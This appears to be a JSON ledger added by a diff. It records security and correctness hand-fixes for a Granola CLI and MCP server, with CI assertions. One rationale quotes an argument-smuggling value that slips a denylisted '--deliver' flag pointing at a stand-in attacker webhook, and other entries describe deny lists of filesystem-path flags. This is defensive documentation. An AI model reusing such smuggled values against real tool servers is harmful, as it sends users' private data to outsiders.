@@ -1,0 +1,550 @@
+{
+ "slug": "granola",
+ "doc": "docs/reprint-survival.md",
+ "_comment": "Connector-specific edits to GENERATED/authored files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one. Provenance: the 2026-07-21 library v7.4x reprint (~/printing-press/library/granola, .printing-press-patches/), the skill/granola branch fixes (REST grammar, duplicate identity), and the 2026-10-13 publish pass (fleet security backports + gate fixes).",
+ "handfixes": [
+  {
+   "id": "rest-transcript-source-grammar",
+   "summary": "preflight, memo, and talktime classify transcript segments with the public REST API's labels (microphone = near, speaker = far) through one shared classifySource, gate on mic >= 5 AND classified >= 10, and exit 4 on unrecognized labels",
+   "why": "Granola 7.4x made the desktop cache app-private, so every transcript now arrives through the public REST API, whose speaker.source is microphone/speaker. The generated gate matched the dead cache vocabulary (system/speakers/mixed), counted zero far-end segments on every real meeting, and failed every preflight with exit 2 - memo queue came back empty and memo run skipped everything. classified must be mic+far, never len(segs): two adversarial rounds found raw-segment-count bypasses where relabelled segments manufactured a pass. Exit 4 separates 'labels unreadable' from 'no transcript' (exit 2). msp-skills commit a6fa0a715 (originally 45e7df4b on skill/granola).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "func classifySource(s string) string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "case \"speaker\":",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "return mic >= 5 && classified >= 10",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "return &cliError{code: 4,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/talktime.go",
+     "contains": "classifySource(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/memo.go",
+     "contains": "mic, far, unknownSegs, unknown := countSources(segs)",
+     "min_count": 2,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "preflight-duplicate-identity-gate",
+   "summary": "preflight exit 3 fires only on an identity match (meeting id in the filename or body, or title AND day); a same-title file from a different day is reported as title_collision and never blocks; the scan reads through an os.Root",
+   "why": "The transcripts layout names files '<YYYY-MM-DD> <Title> - <Org> - Full.md' - date in the name, never the id - so the id branch never fired and the title branch matched every earlier occurrence of a recurring meeting. Callers read exit 3 as 'skip', so real meetings were silently dropped (8 colliding titles measured on the live root). The os.Root scoping (added with the security gate pass) keeps a symlink in the transcripts tree from pulling an outside file into the body check. msp-skills commit 83dc8d2e0 (originally 1fa4e0aa).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "func findDuplicates(root, id, title, day string) (dup string, collisions []string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "res[\"title_collision\"] = collisions",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "contains": "r, err := os.OpenRoot(root)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/preflight.go",
+     "not_contains": "func findDuplicateFile("
+    }
+   ]
+  },
+  {
+   "id": "rest-only-data-pipeline",
+   "summary": "Every read comes from the REST-fed SQLite store (plus Granola's official MCP for human notes); the sealed desktop-cache readers (safestorage, WorkOS/internal API, LoadCache) and the commands that only worked against that cache (chat, recipes, calendar, folder stream, tiptap, warm, workspaces, meetings delete/restore) are removed",
+   "why": "Granola v7.4x seals cache-v6.json.enc behind its own Keychain access group, so a third-party binary can never decrypt it. The generated tree still shipped the decrypt path and a dozen commands that read only that cache - on a current desktop they returned nothing while looking healthy. The library v7.4x reprint (2026-07-21, steps 2-8) rebuilt the read path on the store and removed the dead surface; this ledger keeps a regeneration from bringing it back.",
+   "status": "active",
+   "spec_encode_followup": "Spec/press: a printed CLI should not emit a desktop-cache reader for an app that has sealed its store; the press retro for the v7.4x reprint is in the library scratchpad (2026-07-21 granola-reprint-retro.md).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "func backfillMeetingsMetadataFromStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "not_contains": "granola.LoadCache("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newCalendarCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newRecipesCmd("
+    },
+    {
+     "file": "cli/internal/cli/granola_novels.go",
+     "not_contains": "newWarmCmd("
+    }
+   ]
+  },
+  {
+   "id": "rest-hydrate-presence-aware",
+   "summary": "REST hydration is non-destructive: absent attendees/transcript (nil pointer) preserve stored rows, present-empty clears them, and start/end/calendar fields are guarded independently",
+   "why": "upsertRichMeeting used to DELETE a meeting's attendees and transcript segments whenever a detail response omitted them, so a partial HTTP 200 wiped valid local data (adversarial P1). The pointer fields make 'absent' distinguishable from 'empty'. Library reprint step 1 + c99d4c4.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "Attendees     *[]restAttendee `json:\"attendees\"`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "Transcript    *[]restSegment  `json:\"transcript\"`",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "autorefresh-enrich-clean-install",
+   "summary": "Auto-refresh runs granola.EnsureSchema before its incremental meetings LEFT JOIN, so a clean install hydrates the rich tables on the first command",
+   "why": "On a clean install runApiSync opened only the generic store; the rich meetings table did not exist yet, the join failed with 'no such table: meetings', the error was swallowed, and every KEEP command stayed empty until a manual sync (Codex re-review P1, library fef8cd8).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "contains": "if err := granola.EnsureSchema(ctx, db); err != nil {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "drop-platform-gate",
+   "summary": "The never-registered platform credential gate is removed from root.go, client.go, and the MCP server; the Adaptive limiter and Retry-After handling stay",
+   "why": "registerPlatformSource had no caller, so every gate function early-returned; the dead machinery (3,400 lines) only advertised a tenant binding nothing enforced. Library reprint step 7.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/root.go",
+     "not_contains": "registeredPlatformSource"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "registeredPlatformSource"
+    }
+   ]
+  },
+  {
+   "id": "client-redirect-body-hardening",
+   "summary": "The HTTP client refuses every redirect as a terminal, non-retryable error and rejects (never truncates) a response body over 64 MiB",
+   "why": "A redirect could replay the Authorization header or a request body to a server-chosen Location, and a capped LimitReader silently handed back a truncated JSON document. Library reprint step 9 + the Codex final-review fixup.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "type RedirectRefusedError struct {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "type RedirectResponseError struct {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "respBody, err := readCappedBody(resp.Body, maxResponseBytes)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "auth-set-token-no-argv",
+   "summary": "auth set-token reads the API key from stdin (bounded) or GRANOLA_API_KEY and refuses a command-line argument",
+   "why": "A secret passed as argv lands in shell history and in ps output for the life of the process. Library reprint step 9.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "func readSetTokenValue(cmd *cobra.Command) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "url-pathescape-opaque-id",
+   "summary": "Opaque note ids are url.PathEscape'd at every /v1/notes/{id} call site, CLI and MCP",
+   "why": "EscapePathParam preserves slashes, so an id like 'a/b' addressed a different path. Library reprint step 9 + fixup.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/notes_get.go",
+     "contains": "path := \"/v1/notes/\" + url.PathEscape(args[0])",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/panel.go",
+     "contains": "\"/v1/notes/\"+url.PathEscape(id)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/transcript.go",
+     "contains": "\"/v1/notes/\"+url.PathEscape(id)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "return url.PathEscape(formatMCPParamValue(v))",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "memo-output-file-safety",
+   "summary": "MEMO and export output: 0700 dirs, 0600 files, note-id allowlist, symlink-aware containment, and writes routed through an os.Root on the output directory",
+   "why": "Exports carry private notes, transcripts, and attendee emails. Library reprint step 9 made them owner-only and refused symlink targets; the security-gate pass (G304) moved the open, Lstat, and Chmod onto an os.Root so a swapped path component cannot redirect the write.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "func safeJoinContained(dir, name string) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "r, err := os.OpenRoot(filepath.Dir(path))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granola_helpers.go",
+     "contains": "return r.Chmod(name, safeFilePerm)",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "keychain-secret-via-stdin",
+   "summary": "Granola-MCP OAuth tokens are written to and read from the macOS Keychain through `security -i` with the command line on stdin, so no secret is ever on argv; operands are quoted and a control character is refused",
+   "why": "kcSet used to pass the token as a `security add-generic-password -w <token>` argument, visible to any same-user ps watcher while it ran, and the variable argv tripped gosec G204 three times. A newline in an operand would end the stdin command line and run the rest as a second command, so kcQuote refuses control characters. Round trip proved against a throwaway keychain (keychain_stdin_test.go, GRANOLA_KEYCHAIN_IT=1). The account constants were also renamed off the *Token suffix (gosec G101 false positive on the identifier).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "cmd := exec.Command(\"/usr/bin/security\", \"-i\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "contains": "func kcQuote(v string) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/granolamcp.go",
+     "not_contains": "\"-w\", value).Run()"
+    },
+    {
+     "file": "cli/internal/cli/keychain_stdin_test.go",
+     "contains": "func TestKCQuoteRefusesControlCharacters(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-auth-browser-open-via-openSetupURL",
+   "summary": "mcp-auth login opens the browser through auth.go's openSetupURL (literal per-OS command, URL as one argv element) instead of its own exec call",
+   "why": "This is the same browser-open the press emits in auth.go for OAuth connectors, covered by the fleet's vetted cli/internal/cli/auth.go G204 suppression. Moving the call there keeps one reviewed exec site instead of a second, unreviewed one in mcp_auth.go.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/auth.go",
+     "contains": "func openSetupURL(url string) error {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_auth.go",
+     "contains": "openSetupURL(authURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/mcp_auth.go",
+     "not_contains": "exec.Command(\"open\""
+    }
+   ]
+  },
+  {
+   "id": "sql-limit-bound-parameter",
+   "summary": "The note-id queries bind LIMIT as a parameter (negative = no limit) instead of splicing it into the SQL text",
+   "why": "gosec G202 flagged the string-built SQL. The value was an int, so it was not injectable, but a bound parameter removes the pattern rather than arguing it away.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "contains": "ORDER BY updated_at DESC LIMIT ?`",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "contains": "rows, err := db.QueryContext(ctx, q, lim)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/rest_hydrate.go",
+     "not_contains": "q += fmt.Sprintf(\" LIMIT %d\""
+    },
+    {
+     "file": "cli/internal/cli/sync_autorefresh.go",
+     "not_contains": "q += fmt.Sprintf(\" LIMIT %d\""
+    }
+   ]
+  },
+  {
+   "id": "duplicates-fingerprint-sha256",
+   "summary": "duplicates scan fingerprints with SHA-256 instead of SHA-1",
+   "why": "The fingerprint is a dedup key, not a security boundary, but gosec G401/G505 block SHA-1 outright. It is computed per run and never persisted, so the switch changes no stored value.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "contains": "h := sha256.New()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/duplicates.go",
+     "not_contains": "crypto/sha1"
+    }
+   ]
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "summary": "cliArgsFromMCP joins every tool-call value to its flag as ONE argv element (--json=<value>); bool true stays a bare --flag",
+   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag does not consume the next token, so a VALUE beginning with '--' was parsed as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became `--json --deliver=...` and the denylisted --deliver took effect. Fleet fix #326 (GHSA-w8gj-7q45-jrfq); granola was minted before it and carried the split form.",
+   "status": "upstreamed",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "not_contains": "\"--\"+k, "
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout_test.go",
+     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "summary": "The MCP shell-out layer refuses filesystem-path flags (--db, --out/-o, --output, --home, --audit-dir, and granola's --to and --root) and any argument name carrying '='",
+   "why": "The MCP server runs the companion CLI as the server account; a tool call that may pick --db, an output folder, or a scan root picks where that account writes or what it reads. granola adds two of its own: memo run --to (an --out alias) writes the MEMO triple, and --root (memo, preflight, duplicates) reads file names and same-title file bodies. TestNoShellOutToolCanDirectAFilesystemPath walks the real command tree and failed on `memo run --to` until it was listed. Fleet fix #289.",
+   "status": "upstreamed",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "var blockedDestinationFlags = map[string]bool{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "if blocked[k] || blockedDestinationFlags[k] {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"root\": true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "\"to\":   true,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
+     "contains": "func TestMCPCannotDirectTheLocalStore(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
+     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "doctor-verdict-tracks-reality",
+   "summary": "doctor's api AND credentials verdicts come from a real GET /v1/notes?page_size=1: 2xx = this is the Granola API (and the key works), 401/403 = API present but key rejected, 404 = base_url is not the Granola API root",
+   "why": "The generated doctor called any answer at GET / 'reachable', so a base_url aimed at a web app shell (200 at /, 404 everywhere else) rendered green. check_doctor_truth.py failed granola on exactly that wrong-base state; it passes all states after this change. Issue #282.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "_, perr := c.Get(cmd.Context(), \"/v1/notes\", map[string]string{\"page_size\": \"1\"})",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "case probeStatus == 404:",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "report[\"api\"] = \"reachable\"\n"
+    }
+   ]
+  },
+  {
+   "id": "mcp-http-loopback-default",
+   "summary": "granola-mcp --transport http binds 127.0.0.1:7777 by default instead of every interface",
+   "why": "The HTTP transport has no authentication of its own and the process holds GRANOLA_API_KEY; ':7777' exposed meeting transcripts to anyone who could reach the port on a shared network. mcp-install.md tells operators to keep it on loopback behind a tunnel.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/cmd/granola-mcp/main.go",
+     "contains": "defaultHTTPAddr = \"127.0.0.1:7777\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "It binds the loopback interface",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "install-credentials-declared-on-every-channel",
+   "summary": "GRANOLA_API_KEY (required) and GRANOLA_BASE_URL (optional, defaulted) are declared identically on manifest.json, server.json, and mcp-install.md",
+   "why": "The binary reads GRANOLA_BASE_URL, but the press declared only the key, and server.json called the key required while manifest.json said optional. check_env_schema.py failed on both. Issue #282.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "manifest.json",
+     "contains": "\"GRANOLA_API_KEY\": \"${user_config.granola_api_key}\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"GRANOLA_BASE_URL\": \"${user_config.granola_base_url}\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"GRANOLA_API_KEY\"",
+     "min_count": 1
+    },
+    {
+     "file": "server.json",
+     "contains": "\"name\": \"GRANOLA_BASE_URL\"",
+     "min_count": 1
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"GRANOLA_API_KEY\":",
+     "min_count": 3
+    },
+    {
+     "file": "mcp-install.md",
+     "contains": "\"GRANOLA_BASE_URL\":",
+     "min_count": 3
+    }
+   ]
+  },
+  {
+   "id": "manifest-clean-mcp-binary-name",
+   "summary": "manifest.json names the stripped MCP binary (granola-mcp), not the press's granola-pp-mcp",
+   "why": "The press emits the -pp- name in manifest name/entry_point/command; the shipped binary is granola-mcp.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "manifest.json",
+     "contains": "\"entry_point\": \"bin/granola-mcp\"",
+     "min_count": 1
+    },
+    {
+     "file": "manifest.json",
+     "not_contains": "granola-pp-mcp"
+    }
+   ]
+  }
+ ]
+}
